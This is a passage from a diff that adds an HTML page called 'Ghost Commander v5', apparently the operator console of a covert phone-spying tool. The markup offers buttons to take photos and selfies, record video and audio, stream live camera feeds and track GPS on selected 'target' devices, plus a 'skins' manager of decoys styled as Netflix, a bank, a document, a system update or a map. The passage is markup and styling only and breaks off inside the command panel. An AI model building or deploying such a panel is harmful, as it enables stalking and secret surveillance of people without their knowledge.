@@ -1,0 +1,1126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ghost Commander v5</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Syne:wght@700;800;900&display=swap');
+:root{
+  --bg:#020408;--surf:#060b14;--card:#091018;--border:#0e1c2e;--border2:#162840;
+  --green:#00ff88;--cyan:#00d4ff;--warn:#ff4060;--purple:#c060ff;--gold:#ffcc00;
+  --red:#ff1a3c;--orange:#ff7b00;--pink:#ff3399;--text:#9ab8d8;--muted:#2a4060;
+  --glow-g:0 0 20px rgba(0,255,136,.2);--glow-c:0 0 20px rgba(0,212,255,.2);
+  --glow-w:0 0 20px rgba(255,64,96,.25);--glow-p:0 0 20px rgba(192,96,255,.2);
+  --glow-r:0 0 28px rgba(255,26,60,.4);--glow-gold:0 0 20px rgba(255,204,0,.2);
+  --glow-o:0 0 20px rgba(255,123,0,.2);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%;overflow-x:hidden}
+body{font-family:'JetBrains Mono',monospace;background:var(--bg);color:var(--text);min-height:100vh;position:relative}
+
+/* SCAN LINE EFFECT */
+body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.012) 2px,rgba(0,255,136,.012) 4px)}
+body::after{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:radial-gradient(ellipse at 50% 0%,rgba(0,255,136,.03) 0%,transparent 70%)}
+
+/* ── LOCK SCREEN ── */
+#lockScreen{position:fixed;inset:0;z-index:9000;background:var(--bg);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px}
+#lockScreen.unlocked{display:none}
+.lock-glitch{font-family:'Syne',sans-serif;font-size:30px;font-weight:900;color:var(--green);letter-spacing:6px;text-shadow:var(--glow-g);position:relative}
+.lock-glitch::before{content:attr(data-text);position:absolute;left:2px;top:0;color:var(--warn);opacity:.4;clip-path:polygon(0 30%,100% 30%,100% 50%,0 50%)}
+.lock-sub{font-size:9px;color:var(--muted);letter-spacing:4px;text-transform:uppercase}
+.lock-dots{display:flex;gap:16px;margin:6px 0}
+.lock-dot{width:12px;height:12px;border-radius:50%;border:1.5px solid var(--border2);background:transparent;transition:all .12s}
+.lock-dot.filled{background:var(--green);border-color:var(--green);box-shadow:var(--glow-g)}
+.lock-dot.error{background:var(--warn);border-color:var(--warn);animation:shake .3s ease}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}
+.lock-pad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;width:220px}
+.lock-key{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:18px;text-align:center;font-family:'Syne',sans-serif;font-size:22px;font-weight:700;color:var(--text);cursor:pointer;user-select:none;transition:all .08s;-webkit-tap-highlight-color:transparent}
+.lock-key:active{transform:scale(.88);background:rgba(0,255,136,.06);border-color:var(--green);color:var(--green)}
+.lock-key.del{font-size:13px;color:var(--warn)}
+.lock-err{font-size:9px;color:var(--warn);letter-spacing:2px;min-height:14px;text-align:center}
+
+/* ── HEADER ── */
+.hdr{display:flex;align-items:center;justify-content:space-between;padding:11px 14px;background:rgba(6,11,20,.98);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:300;backdrop-filter:blur(20px)}
+.logo{font-family:'Syne',sans-serif;font-size:17px;font-weight:900;color:var(--green);letter-spacing:4px;text-shadow:var(--glow-g)}
+.logo em{color:var(--warn);font-style:normal}
+.logo sup{font-size:10px;color:var(--muted);font-weight:700}
+.hdr-pills{display:flex;align-items:center;gap:8px}
+.conn-pill{display:flex;align-items:center;gap:5px;background:var(--card);border:1px solid var(--border2);border-radius:100px;padding:4px 10px;font-size:9px;color:var(--muted);letter-spacing:1px}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:var(--glow-g);animation:pulse 1.4s infinite}
+.dot.err{background:var(--warn);box-shadow:var(--glow-w)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.2}}
+.theme-btn{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:5px 9px;color:var(--muted);font-size:13px;cursor:pointer}
+
+/* ── DEVICE BAR ── */
+.dev-bar{background:var(--surf);border-bottom:1px solid var(--border);padding:7px 12px;display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;min-height:46px;align-items:center}
+.dev-bar::-webkit-scrollbar{display:none}
+.dev-chip{flex-shrink:0;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:5px 10px;font-size:10px;cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:5px;white-space:nowrap;-webkit-tap-highlight-color:transparent}
+.dev-chip.online{border-color:rgba(0,255,136,.4);color:var(--green)}
+.dev-chip.offline{color:var(--muted)}
+.dev-chip.selected{background:rgba(0,255,136,.07);box-shadow:var(--glow-g);border-color:var(--green)}
+.dev-chip.live{border-color:var(--red);color:var(--red);animation:livePulse 1s infinite}
+@keyframes livePulse{0%,100%{box-shadow:0 0 6px rgba(255,26,60,.25)}50%{box-shadow:0 0 18px rgba(255,26,60,.7)}}
+.dev-chip .cdot{width:5px;height:5px;border-radius:50%;background:currentColor}
+.dev-empty{color:var(--muted);font-size:10px}
+
+/* ── TABS ── */
+.tabs{display:flex;background:var(--surf);border-bottom:1px solid var(--border);position:sticky;top:52px;z-index:200;overflow-x:auto;scrollbar-width:none}
+.tabs::-webkit-scrollbar{display:none}
+.tab{flex:1;padding:11px 4px;text-align:center;font-size:9px;letter-spacing:1px;cursor:pointer;color:var(--muted);border-bottom:2px solid transparent;transition:all .2s;user-select:none;min-width:56px;white-space:nowrap;-webkit-tap-highlight-color:transparent}
+.tab.active{color:var(--green);border-bottom-color:var(--green)}
+.tab.active.red-tab{color:var(--red);border-bottom-color:var(--red)}
+.badge{color:var(--warn);font-size:8px;margin-left:2px}
+.live-dot{color:var(--red);font-size:8px;margin-left:2px;animation:pulse 1s infinite}
+
+.panel{display:none;padding:12px;max-width:560px;margin:0 auto;position:relative;z-index:1}
+.panel.active{display:block}
+.sec{font-size:8px;color:var(--muted);letter-spacing:3px;text-transform:uppercase;margin-bottom:8px;padding-left:2px}
+.gap{margin-bottom:12px}
+
+/* ── TARGET ROW ── */
+.target-row{display:flex;gap:6px;margin-bottom:12px}
+.t-chip{flex:1;background:var(--card);border:1px solid var(--border);border-radius:10px;padding:9px 6px;text-align:center;font-size:10px;cursor:pointer;transition:all .15s;-webkit-tap-highlight-color:transparent}
+.t-chip.active{border-color:var(--green);color:var(--green);background:rgba(0,255,136,.05)}
+.t-chip .tl{font-size:8px;color:var(--muted);margin-bottom:2px;letter-spacing:1px}
+
+/* ── CMD GRID ── */
+.cmd-cat{margin-bottom:14px}
+.cmd-cat-title{font-size:8px;color:var(--muted);letter-spacing:2.5px;text-transform:uppercase;margin-bottom:7px;display:flex;align-items:center;gap:8px}
+.cmd-cat-title::after{content:'';flex:1;height:1px;background:var(--border)}
+.cmd-grid{display:grid;grid-template-columns:1fr 1fr;gap:7px}
+.cmd-grid.tri{grid-template-columns:1fr 1fr 1fr}
+.cmd-btn{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:11px 7px;text-align:center;cursor:pointer;transition:all .15s;font-family:'JetBrains Mono',monospace;color:var(--text);display:flex;flex-direction:column;align-items:center;gap:4px;-webkit-tap-highlight-color:transparent;user-select:none}
+.cmd-btn:active{transform:scale(.93);opacity:.7}
+.cmd-btn .ci{font-size:22px}
+.cmd-btn .cn{font-size:10px;line-height:1.2}
+.cmd-btn .cl{font-size:8px;letter-spacing:1px;margin-top:1px}
+.g  .cl{color:var(--green)}.g:hover{border-color:var(--green);box-shadow:var(--glow-g)}
+.c  .cl{color:var(--cyan)}.c:hover{border-color:var(--cyan);box-shadow:var(--glow-c)}
+.w  .cl{color:var(--warn)}.w:hover{border-color:var(--warn);box-shadow:var(--glow-w)}
+.p  .cl{color:var(--purple)}.p:hover{border-color:var(--purple);box-shadow:var(--glow-p)}
+.gd .cl{color:var(--gold)}.gd:hover{border-color:var(--gold);box-shadow:var(--glow-gold)}
+.r  .cl{color:var(--red)}.r:hover{border-color:var(--red);box-shadow:var(--glow-r)}
+.o  .cl{color:var(--orange)}.o:hover{border-color:var(--orange);box-shadow:var(--glow-o)}
+.pk .cl{color:var(--pink)}.pk:hover{border-color:var(--pink)}
+
+/* ── PARAM QUICK-SET ── */
+.param-row{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:10px 12px;margin-bottom:10px;display:flex;align-items:center;gap:8px}
+.param-lbl{font-size:9px;color:var(--muted);letter-spacing:1px;white-space:nowrap}
+.param-in{flex:1;background:var(--surf);border:1px solid var(--border2);border-radius:6px;padding:7px 10px;color:var(--green);font-family:'JetBrains Mono',monospace;font-size:11px;outline:none}
+.param-in:focus{border-color:var(--green)}
+.param-in::placeholder{color:var(--muted)}
+
+/* ── CUSTOM CMD ── */
+.custom-wrap{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:11px 12px;margin-bottom:10px}
+.custom-lbl{font-size:8px;color:var(--muted);letter-spacing:2px;margin-bottom:8px}
+.custom-row{display:flex;gap:7px}
+.custom-in{flex:1;background:var(--surf);border:1px solid var(--border2);border-radius:8px;padding:9px 12px;color:var(--green);font-family:'JetBrains Mono',monospace;font-size:11px;outline:none}
+.custom-in:focus{border-color:var(--green)}
+.custom-in::placeholder{color:var(--muted)}
+.send-btn{background:var(--green);border:none;border-radius:8px;padding:9px 14px;color:#000;font-family:'Syne',sans-serif;font-size:12px;font-weight:800;cursor:pointer}
+.send-btn:active{opacity:.8;transform:scale(.95)}
+
+/* ── QUICK CMDS (saved) ── */
+.qcmds-wrap{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px}
+.qcmd-pill{background:var(--card);border:1px solid var(--border2);border-radius:100px;padding:5px 12px;font-size:10px;color:var(--cyan);cursor:pointer;transition:all .15s;-webkit-tap-highlight-color:transparent}
+.qcmd-pill:active{background:rgba(0,212,255,.1);border-color:var(--cyan)}
+
+/* ── GALLERY ── */
+.gallery-bar{display:flex;gap:7px;margin-bottom:10px;align-items:center}
+.gallery-sel{flex:1;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:7px 10px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:10px;outline:none}
+.gallery-sel option{background:var(--card)}
+.gallery-ref{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:7px 12px;color:var(--green);font-size:16px;cursor:pointer}
+.gallery-cnt{font-size:9px;color:var(--muted);margin-bottom:8px}
+.gallery-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:7px;margin-bottom:14px}
+.g-item{background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden;cursor:pointer;transition:border-color .2s}
+.g-item:active{border-color:var(--purple);transform:scale(.97)}
+.g-item img{width:100%;aspect-ratio:4/3;object-fit:cover;display:block}
+.g-item video{width:100%;aspect-ratio:4/3;object-fit:cover;display:block}
+.g-item audio{width:100%;padding:8px}
+.g-item-info{padding:6px 9px}
+.g-type{font-size:8px;letter-spacing:1px}.g-time{font-size:8px;color:var(--muted);margin-top:1px}.g-dev{font-size:8px;color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.gallery-empty{text-align:center;padding:40px 12px;color:var(--muted);font-size:11px;border:1px dashed var(--border);border-radius:12px}
+.g-dl-btn{display:block;width:100%;padding:5px;background:rgba(0,255,136,.06);border:none;border-top:1px solid var(--border);color:var(--green);font-size:9px;cursor:pointer;font-family:'JetBrains Mono',monospace;letter-spacing:1px}
+.g-dl-btn:active{background:rgba(0,255,136,.15)}
+
+/* ── FEED ── */
+.feed-wrap{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden}
+.feed-hdr{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;border-bottom:1px solid var(--border);font-size:9px;color:var(--muted);letter-spacing:1px}
+.clr-btn{background:none;border:1px solid transparent;border-radius:4px;color:var(--warn);font-family:'JetBrains Mono',monospace;font-size:9px;cursor:pointer;padding:2px 7px}
+.clr-btn:hover{border-color:var(--warn)}
+.feed-list{max-height:60vh;overflow-y:auto}
+.feed-list::-webkit-scrollbar{width:2px}
+.feed-list::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.f-item{border-bottom:1px solid var(--border);padding:10px 12px;animation:slideUp .25s ease}
+@keyframes slideUp{from{opacity:0;transform:translateY(-5px)}to{opacity:1;transform:none}}
+.f-meta{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px}
+.f-badge{font-size:8px;padding:2px 8px;border-radius:100px;letter-spacing:1.5px;text-transform:uppercase}
+.f-badge.info{background:rgba(0,212,255,.07);border:1px solid var(--cyan);color:var(--cyan)}
+.f-badge.photo,.f-badge.capture,.f-badge.selfie{background:rgba(192,96,255,.07);border:1px solid var(--purple);color:var(--purple)}
+.f-badge.location,.f-badge.location_track{background:rgba(0,255,136,.07);border:1px solid var(--green);color:var(--green)}
+.f-badge.audio{background:rgba(255,64,96,.07);border:1px solid var(--warn);color:var(--warn)}
+.f-badge.live,.f-badge.live_frame,.f-badge.live_status{background:rgba(255,26,60,.07);border:1px solid var(--red);color:var(--red)}
+.f-badge.video,.f-badge.video_status{background:rgba(255,123,0,.07);border:1px solid var(--orange);color:var(--orange)}
+.f-badge.timelapse,.f-badge.timelapse_frame{background:rgba(255,204,0,.07);border:1px solid var(--gold);color:var(--gold)}
+.f-badge.battery,.f-badge.status,.f-badge.network,.f-badge.storage{background:rgba(0,212,255,.07);border:1px solid var(--cyan);color:var(--cyan)}
+.f-badge.motion,.f-badge.orientation,.f-badge.light{background:rgba(192,96,255,.07);border:1px solid var(--purple);color:var(--purple)}
+.f-badge.fx,.f-badge.vibrate,.f-badge.speak,.f-badge.flash{background:rgba(255,204,0,.07);border:1px solid var(--gold);color:var(--gold)}
+.f-time{font-size:8px;color:var(--muted)}
+.f-dev{font-size:8px;color:var(--muted);margin-bottom:5px}
+.f-body{font-size:10px;color:var(--text);word-break:break-all;line-height:1.6}
+.f-body pre{white-space:pre-wrap;font-size:9px;color:var(--green)}
+.f-img{width:100%;border-radius:6px;margin-top:6px;max-height:220px;object-fit:cover;cursor:pointer}
+.f-audio{width:100%;margin-top:6px;filter:invert(1) hue-rotate(180deg);border-radius:6px}
+.f-map-link{display:inline-block;margin-top:5px;font-size:9px;color:var(--cyan);text-decoration:none;border-bottom:1px solid rgba(0,212,255,.3)}
+.f-map-link:hover{color:var(--green)}
+
+/* ── DEVICES PANEL ── */
+.dev-stats{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-bottom:12px}
+.dev-stat{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px;text-align:center}
+.dev-stat-n{font-size:26px;font-weight:800;font-family:'Syne',sans-serif;color:var(--green)}
+.dev-stat-l{font-size:8px;color:var(--muted);letter-spacing:2px;margin-top:3px}
+.dev-list{display:flex;flex-direction:column;gap:7px}
+.dev-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:11px 13px;cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:10px;-webkit-tap-highlight-color:transparent}
+.dev-card.online{border-color:rgba(0,255,136,.3)}
+.dev-card.selected{background:rgba(0,255,136,.05);box-shadow:var(--glow-g)}
+.dev-card.live-on{border-color:var(--red);animation:livePulse 1.2s infinite}
+.dev-icon{font-size:20px}
+.dev-id{font-size:11px;color:var(--text)}
+.dev-seen{font-size:9px;color:var(--muted);margin-top:2px}
+.dev-bat{font-size:9px;color:var(--gold);margin-top:2px}
+.dev-pill{font-size:8px;padding:3px 8px;border-radius:100px;letter-spacing:1.5px;border:1px solid;margin-left:auto;flex-shrink:0}
+.dev-pill{border-color:var(--green);color:var(--green)}
+.dev-pill.offline{border-color:var(--muted);color:var(--muted)}
+.dev-pill.live-pill{border-color:var(--red);color:var(--red)}
+.no-devs{text-align:center;padding:36px;color:var(--muted);font-size:11px;border:1px dashed var(--border);border-radius:12px}
+
+/* ── LIVE PANEL ── */
+.live-status-bar{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:10px 14px;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between;font-size:10px}
+.live-indicator{display:flex;align-items:center;gap:6px;color:var(--red)}
+.live-indicator.off{color:var(--muted)}
+.live-viewport{background:#000;border:1px solid var(--border);border-radius:10px;overflow:hidden;aspect-ratio:4/3;margin-bottom:10px;position:relative;display:flex;align-items:center;justify-content:center}
+.live-viewport img{width:100%;height:100%;object-fit:cover;display:block}
+.live-placeholder{color:var(--muted);font-size:11px;text-align:center;padding:20px}
+.live-overlay-badge{position:absolute;top:8px;left:8px;background:rgba(255,26,60,.85);color:#fff;font-size:9px;font-weight:700;padding:3px 9px;border-radius:100px;letter-spacing:2px;animation:pulse 1s infinite}
+.live-fps-badge{position:absolute;top:8px;right:8px;background:rgba(0,0,0,.7);color:var(--green);font-size:9px;padding:3px 8px;border-radius:6px}
+.live-cmds{display:grid;grid-template-columns:1fr 1fr 1fr;gap:7px}
+.live-btn{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:10px;text-align:center;cursor:pointer;font-size:10px;transition:all .15s;-webkit-tap-highlight-color:transparent}
+.live-btn:active{opacity:.7;transform:scale(.94)}
+.live-btn.r{border-color:rgba(255,26,60,.4);color:var(--red)}
+.live-btn.g{color:var(--green)}
+.live-btn.c{color:var(--cyan)}
+
+/* ── MAP PANEL ── */
+.map-frame{width:100%;border-radius:10px;border:1px solid var(--border);height:280px;background:var(--card);margin-bottom:10px;overflow:hidden;display:flex;align-items:center;justify-content:center}
+.map-placeholder{color:var(--muted);font-size:11px;text-align:center;padding:20px}
+.loc-info{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px;font-size:10px;line-height:1.8}
+.loc-row{display:flex;justify-content:space-between;border-bottom:1px solid var(--border);padding-bottom:5px;margin-bottom:5px}
+.loc-row:last-child{border:none;margin:0;padding:0}
+.loc-lbl{color:var(--muted)}
+.loc-val{color:var(--green);font-weight:700}
+
+/* ── DECOY MANAGER ── */
+.decoy-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
+.decoy-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px;cursor:pointer;transition:all .15s;text-align:center;-webkit-tap-highlight-color:transparent}
+.decoy-card:active{transform:scale(.95)}
+.decoy-card .dc-icon{font-size:28px;margin-bottom:6px}
+.decoy-card .dc-name{font-size:10px;color:var(--text)}
+.decoy-card .dc-cmd{font-size:8px;color:var(--muted);margin-top:2px;letter-spacing:1px}
+.decoy-card.netflix{border-color:rgba(229,9,20,.4)}.decoy-card.netflix:hover{box-shadow:0 0 16px rgba(229,9,20,.2)}
+.decoy-card.docs{border-color:rgba(26,115,232,.4)}.decoy-card.docs:hover{box-shadow:0 0 16px rgba(26,115,232,.2)}
+.decoy-card.bank{border-color:rgba(0,48,135,.5)}.decoy-card.bank:hover{box-shadow:0 0 16px rgba(0,48,135,.3)}
+.decoy-card.update{border-color:rgba(0,122,255,.4)}.decoy-card.update:hover{box-shadow:0 0 16px rgba(0,122,255,.2)}
+.decoy-card.maps{border-color:rgba(52,168,83,.4)}.decoy-card.maps:hover{box-shadow:0 0 16px rgba(52,168,83,.2)}
+.decoy-card.photo{border-color:rgba(192,96,255,.4)}.decoy-card.photo:hover{box-shadow:0 0 16px rgba(192,96,255,.2)}
+
+/* ── TOAST ── */
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:var(--green);color:#000;font-family:'Syne',sans-serif;font-weight:800;font-size:11px;padding:8px 18px;border-radius:100px;z-index:9999;white-space:nowrap;letter-spacing:1px;animation:toastIn .2s ease}
+@keyframes toastIn{from{opacity:0;transform:translateX(-50%) translateY(8px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
+
+/* ── FULLSCREEN IMG VIEWER ── */
+#imgViewer{display:none;position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.96);flex-direction:column;align-items:center;justify-content:center}
+#imgViewer.open{display:flex}
+#imgViewer img{max-width:95vw;max-height:85vh;object-fit:contain;border-radius:6px}
+#imgViewer .iv-close{position:absolute;top:14px;right:16px;font-size:22px;cursor:pointer;color:#fff;background:rgba(255,255,255,.1);border:none;width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center}
+#imgViewer .iv-dl{position:absolute;bottom:20px;background:var(--green);color:#000;border:none;padding:10px 24px;border-radius:100px;font-family:'Syne',sans-serif;font-weight:800;font-size:13px;cursor:pointer}
+
+/* ── STATUS BAR ── */
+.status-bar{background:var(--surf);border-top:1px solid var(--border);padding:6px 14px;position:fixed;bottom:0;left:0;right:0;z-index:200;display:flex;align-items:center;justify-content:space-between;font-size:8px;color:var(--muted)}
+.status-bar span{display:flex;align-items:center;gap:5px}
+</style>
+</head>
+<body>
+
+<!-- ════════════════════════════════════════════ LOCK SCREEN -->
+<div id="lockScreen">
+  <div class="lock-glitch" data-text="GHOST CMD">GHOST CMD</div>
+  <div class="lock-sub">Enter Access Code</div>
+  <div class="lock-dots" id="lockDots">
+    <div class="lock-dot" id="d0"></div><div class="lock-dot" id="d1"></div>
+    <div class="lock-dot" id="d2"></div><div class="lock-dot" id="d3"></div>
+  </div>
+  <div class="lock-err" id="lockErr"></div>
+  <div class="lock-pad">
+    <div class="lock-key" onclick="lkTap('1')">1</div>
+    <div class="lock-key" onclick="lkTap('2')">2</div>
+    <div class="lock-key" onclick="lkTap('3')">3</div>
+    <div class="lock-key" onclick="lkTap('4')">4</div>
+    <div class="lock-key" onclick="lkTap('5')">5</div>
+    <div class="lock-key" onclick="lkTap('6')">6</div>
+    <div class="lock-key" onclick="lkTap('7')">7</div>
+    <div class="lock-key" onclick="lkTap('8')">8</div>
+    <div class="lock-key" onclick="lkTap('9')">9</div>
+    <div class="lock-key" style="opacity:0" onclick="">·</div>
+    <div class="lock-key" onclick="lkTap('0')">0</div>
+    <div class="lock-key del" onclick="lkDel()">⌫</div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════ HEADER -->
+<div class="hdr">
+  <div class="logo">GHOST<em>CMD</em> <sup>v5</sup></div>
+  <div class="hdr-pills">
+    <div class="conn-pill"><div class="dot" id="liveDot"></div><span id="connTxt">---</span></div>
+  </div>
+</div>
+
+<!-- DEVICE BAR -->
+<div class="dev-bar" id="devBar"><div class="dev-empty">No devices yet</div></div>
+
+<!-- TABS -->
+<div class="tabs">
+  <div class="tab active" id="tab-cmd"    onclick="showTab('cmd')">CMD</div>
+  <div class="tab"        id="tab-decoy"  onclick="showTab('decoy')">SKINS</div>
+  <div class="tab"        id="tab-live"   onclick="showTab('live')">LIVE<span class="live-dot" id="liveBadge" style="display:none">●</span></div>
+  <div class="tab"        id="tab-gallery"onclick="showTab('gallery')">GALLERY<span class="badge" id="galBadge" style="display:none"></span></div>
+  <div class="tab"        id="tab-map"    onclick="showTab('map')">MAP</div>
+  <div class="tab"        id="tab-devices"onclick="showTab('devices')">DEVICES</div>
+  <div class="tab"        id="tab-feed"   onclick="showTab('feed')">FEED<span class="badge" id="feedBadge" style="display:none"></span></div>
+</div>
+
+<!-- ════════════════════════ PANEL: CMD -->
+<div class="panel active" id="panel-cmd">
+
+  <!-- Target selector -->
+  <div class="sec gap">TARGET</div>
+  <div class="target-row" id="targetRow">
+    <div class="t-chip active" id="tc-all" onclick="setTarget('all')">
+      <div class="tl">MODE</div>ALL
+    </div>
+    <div class="t-chip" id="tc-sel" onclick="setTarget('selected')">
+      <div class="tl">DEVICE</div><span id="tc-sel-txt">NONE</span>
+    </div>
+  </div>
+
+  <!-- Quick commands (saved) -->
+  <div class="sec">QUICK FIRE</div>
+  <div class="qcmds-wrap" id="qcmds">
+    <div class="qcmd-pill" onclick="sendCmd('capture')">📷 capture</div>
+    <div class="qcmd-pill" onclick="sendCmd('selfie')">🤳 selfie</div>
+    <div class="qcmd-pill" onclick="sendCmd('location')">📍 location</div>
+    <div class="qcmd-pill" onclick="sendCmd('battery')">🔋 battery</div>
+    <div class="qcmd-pill" onclick="sendCmd('status')">📊 status</div>
+    <div class="qcmd-pill" onclick="sendCmd('ping')">🏓 ping</div>
+    <div class="qcmd-pill" onclick="sendCmdP('audio','10')">🎤 audio·10s</div>
+    <div class="qcmd-pill" onclick="sendCmd('network')">📶 network</div>
+  </div>
+
+  <!-- Custom -->
+  <div class="sec">CUSTOM COMMAND</div>
+  <div class="custom-wrap">
+    <div class="custom-lbl">COMMAND : PARAM</div>
+    <div class="custom-row">
+      <input class="custom-in" id="cmdIn"   placeholder="e.g.  burst" />
+      <input class="custom-in" id="paramIn" placeholder="param (opt)" style="max-width:110px" />
+      <button class="send-btn" onclick="sendCustom()">SEND</button>
+    </div>
+  </div>
+
+  <!-- Param quick-set -->
+  <div class="param-row">
+    <span class="param-lbl">⏱ DUR</span>
+    <input class="param-in" id="durParam" placeholder="seconds (e.g. 15)" style="max-width:120px">
+    <span class="param-lbl" style="margin-left:4px">📸 BURST</span>
+    <input class="param-in" id="burstParam" placeholder="count (3-8)" style="max-width:110px">
+  </div>
+
+  <!-- Camera -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">📷 CAMERA</div>
+    <div class="cmd-grid">
+      <div class="cmd-btn g" onclick="sendCmd('capture')"><div class="ci">📸</div><div class="cn">Rear Photo</div><div class="cl">CAPTURE</div></div>
+      <div class="cmd-btn g" onclick="sendCmd('selfie')"><div class="ci">🤳</div><div class="cn">Front Photo</div><div class="cl">SELFIE</div></div>
+      <div class="cmd-btn p" onclick="sendCmdDur('burst')"><div class="ci">💥</div><div class="cn">Burst Rear</div><div class="cl">BURST ×N</div></div>
+      <div class="cmd-btn p" onclick="sendCmdDur('burst_front')"><div class="ci">🔁</div><div class="cn">Burst Front</div><div class="cl">BURST_FRONT</div></div>
+    </div>
+  </div>
+
+  <!-- Timelapse -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">⏱ TIMELAPSE</div>
+    <div class="cmd-grid tri">
+      <div class="cmd-btn gd" onclick="sendCmdP('timelapse','5:10')"><div class="ci">📽️</div><div class="cn">Start Rear</div><div class="cl">5s×10</div></div>
+      <div class="cmd-btn gd" onclick="sendCmdP('timelapse_front','5:10')"><div class="ci">🎬</div><div class="cn">Start Front</div><div class="cl">FRONT</div></div>
+      <div class="cmd-btn w" onclick="sendCmd('timelapse_stop')"><div class="ci">⏹️</div><div class="cn">Stop</div><div class="cl">STOP</div></div>
+    </div>
+  </div>
+
+  <!-- Video -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">🎥 VIDEO</div>
+    <div class="cmd-grid tri">
+      <div class="cmd-btn o" onclick="sendCmdDur('video')"><div class="ci">🎥</div><div class="cn">Rear Video</div><div class="cl">RECORD</div></div>
+      <div class="cmd-btn o" onclick="sendCmdDur('video_front')"><div class="ci">📹</div><div class="cn">Front Video</div><div class="cl">VID_FRONT</div></div>
+      <div class="cmd-btn w" onclick="sendCmd('video_stop')"><div class="ci">⏹️</div><div class="cn">Stop</div><div class="cl">STOP</div></div>
+    </div>
+  </div>
+
+  <!-- Live Stream -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">🔴 LIVE STREAM</div>
+    <div class="cmd-grid tri">
+      <div class="cmd-btn r" onclick="sendCmdP('live','2')"><div class="ci">🔴</div><div class="cn">Live Rear</div><div class="cl">STREAM</div></div>
+      <div class="cmd-btn r" onclick="sendCmdP('live_front','2')"><div class="ci">📡</div><div class="cn">Live Front</div><div class="cl">FRONT</div></div>
+      <div class="cmd-btn w" onclick="sendCmd('live_stop')"><div class="ci">⏹️</div><div class="cn">Stop</div><div class="cl">STOP</div></div>
+    </div>
+  </div>
+
+  <!-- Audio -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">🎤 AUDIO</div>
+    <div class="cmd-grid tri">
+      <div class="cmd-btn w" onclick="sendCmdDur('audio')"><div class="ci">🎤</div><div class="cn">Record</div><div class="cl">MIC</div></div>
+      <div class="cmd-btn c" onclick="sendCmdP('audio','5')"><div class="ci">🔊</div><div class="cn">5s Clip</div><div class="cl">QUICK</div></div>
+      <div class="cmd-btn c" onclick="sendCmdP('audio','30')"><div class="ci">⏺️</div><div class="cn">30s Clip</div><div class="cl">LONG</div></div>
+    </div>
+  </div>
+
+  <!-- Sensors & Location -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">📡 SENSORS & LOCATION</div>
+    <div class="cmd-grid">
+      <div class="cmd-btn g" onclick="sendCmd('location')"><div class="ci">📍</div><div class="cn">Get GPS</div><div class="cl">LOCATION</div></div>
+      <div class="cmd-btn g" onclick="sendCmdP('track_start','15')"><div class="ci">🗺️</div><div class="cn">Track GPS</div><div class="cl">EVERY 15s</div></div>
+      <div class="cmd-btn w" onclick="sendCmd('track_stop')"><div class="ci">🛑</div><div class="cn">Stop Track</div><div class="cl">TRACK_STOP</div></div>
+      <div class="cmd-btn c" onclick="sendCmd('battery')"><div class="ci">🔋</div><div class="cn">Battery</div><div class="cl">BAT</div></div>
+      <div class="cmd-btn c" onclick="sendCmd('network')"><div class="ci">📶</div><div class="cn">Network</div><div class="cl">WIFI</div></div>
+      <div class="cmd-btn c" onclick="sendCmd('storage')"><div class="ci">💾</div><div class="cn">Storage</div><div class="cl">DISK</div></div>
+      <div class="cmd-btn p" onclick="sendCmd('orientation')"><div class="ci">🧭</div><div class="cn">Tilt/Orient</div><div class="cl">GYRO</div></div>
+      <div class="cmd-btn p" onclick="sendCmd('motion')"><div class="ci">📳</div><div class="cn">Motion</div><div class="cl">ACCEL</div></div>
